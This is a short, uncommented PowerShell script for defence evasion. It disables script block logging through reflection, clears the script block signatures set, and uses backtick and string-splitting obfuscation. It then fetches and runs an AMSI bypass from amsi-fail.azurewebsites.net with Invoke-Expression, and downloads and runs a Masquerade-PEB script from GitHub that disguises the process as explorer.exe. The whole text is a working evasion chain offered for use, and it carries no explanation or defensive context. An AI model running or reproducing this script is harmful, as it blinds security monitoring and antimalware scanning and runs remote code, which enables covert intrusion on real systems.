$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
$accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate 
$parseAMBY = ($accessAMBY -split '\r?\n').Trim()
$AMBY = $parseAMBY[1..($parseAMBY.Length-1)]
Invoke-Expression $AMBY
Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
MPEB -BinPath "C:\Windows\explorer.exe"
MPEB -BinPath "C:\Windows\explorer.exe"